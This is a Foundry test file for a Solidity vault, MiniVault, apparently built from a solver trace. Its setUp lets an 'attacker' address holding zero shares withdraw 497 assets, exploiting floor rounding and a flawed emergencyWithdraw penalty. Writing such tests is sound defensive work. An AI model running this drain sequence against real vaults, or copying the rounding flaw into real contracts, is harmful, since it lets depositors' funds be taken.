// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {MiniVault} from "src/MiniVault_929c95.sol";

// reasoning: The solver trace reaches withdraw() with totalSupply_old=1,
// totalAssets_old=4, msg.sender balance=0, and assetsRequested=2. A safe vault
// must not allow a zero-share caller to remove assets without burning shares.
// This test reaches that exact state through public calls
// (deposit -> emergencyWithdraw -> withdraw) and then repeats the trace's withdraw(2),
// asserting the trace's expected totalSupply_new=0.

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient balance");
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PropertyTest is Test {
    MiniVault public vault;
    MockERC20 public token;

    address internal alice = address(0xA11CE);
    address internal attacker = address(0xB0B);

    function setUp() public {
        token = new MockERC20();
        vault = new MiniVault(address(token));

        // Establish a vault with real deposits.
        token.mint(alice, 600);
        vm.startPrank(alice);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(600);

        // Burn all but one share using the flawed absolute penalty calculation.
        // Leaves totalSupply = 1, totalAssets = 501, and alice's share balance = 1.
        vault.emergencyWithdraw(599);
        vm.stopPrank();

        // Move to the exact solver-reported state: totalSupply = 1, totalAssets = 4.
        // The attacker has zero vault shares, but the vault's floor rounding makes
        // sharesToBurn == 0 for this 497-asset withdrawal.
        vm.prank(attacker);
        vault.withdraw(497);

        assertEq(vault.totalSupply(), 1);
        assertEq(vault.totalAssets(), 4);
        assertEq(vault.balances(attacker), 0);
    }

    function invariant_property_verification() public {
        uint256 supplyBefore = vault.totalSupply();
        uint256 assetsBefore = vault.totalAssets();

        // Only exercise the exact counterexample state from the solver trace.
        if (supplyBefore != 1 || assetsBefore != 4) {
            return;
        }

        // assetsRequested from the solver trace is 2.
        vm.prank(attacker);
        try vault.withdraw(2) {
            // Trace expects the single outstanding share to be burned.
            assertEq(vault.totalSupply(), 0, "withdraw succeeded without burning the outstanding share");
            assertEq(vault.totalAssets(), 2, "trace expects totalAssets_new == 2");
            assertEq(vault.balances(attacker), 0, "attacker still holds zero shares");
        } catch Error(string memory) {
            // Safe behavior: a zero-share caller requesting this withdrawal is rejected.
            assertEq(vault.balances(attacker), 0);
        } catch {
            // Safe behavior for non-string reverts.
            assertEq(vault.balances(attacker), 0);
        }
    }
}